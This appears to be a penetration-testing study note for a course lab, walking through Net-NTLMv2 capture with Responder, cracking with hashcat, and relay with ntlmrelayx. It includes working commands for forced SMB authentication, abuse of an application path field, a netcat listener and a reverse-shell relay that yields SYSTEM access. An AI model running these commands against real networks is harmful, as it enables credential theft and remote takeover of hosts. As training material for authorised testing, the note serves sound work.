# Net-NTLMv2 Capture, Crack, and Relay

A captured **Net-NTLMv2 challenge-response is not the same thing as an NTLM password hash**. It is produced during Windows network authentication and is normally **cracked** or **relayed**.

## Capture with Responder

Find the correct Kali interface, then start Responder:

```bash
ip a
sudo responder -I <INTERFACE>
```

From a Windows shell, force an SMB authentication attempt to the Kali host:

```cmd
dir \\<KALI_IP>\test
```

The share does not need to exist; the goal is the authentication attempt. A suitable Windows application that processes a UNC path may also trigger SMB authentication.

Save the captured challenge-response to a file, then identify/crack it:

```bash
hashcat --help | grep -i 'ntlm'
hashcat -m 5600 netntlmv2.hash /usr/share/wordlists/rockyou.txt
```

## Relay instead of crack

Relay is useful when the captured credential is too strong to crack and another reachable system will accept the authentication.

For broader SMB relay testing, first identify hosts where SMB signing is not required:

```bash
nxc smb <SUBNET>/24 -u '' -p '' --gen-relay-list unsigned.txt
```

For the single-target Chapter 13 pattern:

```bash
sudo impacket-ntlmrelayx \
  --no-http-server \
  -smb2support \
  -t <TARGET_IP> \
  -c '<COMMAND>'
```

Then trigger authentication from the victim again:

```cmd
dir \\<KALI_IP>\test
```

If the relayed identity is accepted and has the required privileges on the target, `ntlmrelayx` can execute the supplied command.


## Application-induced authentication — Chapter 24 chain

Do not limit forced authentication to typing `dir \\<KALI_IP>\test` in a shell. A **server-side application feature** that accepts a path/network location can make the underlying Windows process authenticate to you.

Look for fields/features such as:

```text
backup directory
import/export path
remote file/share path
UNC/network location
```

A Chapter 24 WordPress backup plugin accepted a backup destination path. Pointing the field at Kali caused the server-side process to authenticate outward:

```text
//<KALI_IP>/test
```

The path itself does not need to exist; the goal is the authentication attempt.

### Build the relay path from multiple findings

```text
application can reach attacker-controlled UNC/path
    +
application runs as a useful local identity
    +
relay target has SMB signing disabled
    +
relayed identity is accepted / privileged on target
    ↓
ntlmrelayx command execution on target
```

In Chapter 24, BloodHound/session information suggested the local Administrator context on the application server, and SMB enumeration showed unsigned SMB targets. These findings were combined rather than discovered in one step.

Behind a pivot, enumerate SMB signing with your normal SOCKS/Proxychains path if needed:

```bash
proxychains -q crackmapexec smb <TARGETS> \
  -u <DOMAIN_USER> -d <DOMAIN> -p '<PASSWORD>' --shares
```

Look for:

```text
signing:False
```

### Relay and execute a callback

Start the listener/callback **before** triggering authentication:

```bash
nc -nvlp 9999
```

Then:

```bash
sudo impacket-ntlmrelayx \
  --no-http-server \
  -smb2support \
  -t <RELAY_TARGET> \
  -c '<REVERSE_SHELL_OR_COMMAND>'
```

Finally, set/save the vulnerable application's path to:

```text
//<KALI_IP>/test
```

Validate the resulting shell:

```powershell
whoami
hostname
```

A successful Chapter 24-style chain ends with `NT AUTHORITY\SYSTEM` on the relay target, after which you should **re-enumerate the host before moving on**.

Related: [[Active Directory/After-escalation-before-movement|After escalation before movement]] · [[Methodology/Assembling the Pieces — End-to-End OSCP Attack Chain|Assembling the Pieces]]

## Standalone-Windows caveat

Outside Active Directory, UAC remote restrictions can prevent remote administrative execution for local administrator-group users other than the built-in local `Administrator` account. Relay success therefore depends on both **authentication acceptance** and **effective remote privileges**.

## Quick decision

```text
Net-NTLMv2 captured
  ├─ weak/guessable password? → Hashcat mode 5600
  └─ crack impractical?
        → check relay conditions / SMB signing
        → ntlmrelayx to another host
```

See [[Basics/Password Attacks/NTLM and Pass-the-Hash|NTLM Hashes and Pass-the-Hash]] for the separate **NTLM hash / Pass-the-Hash** workflow.
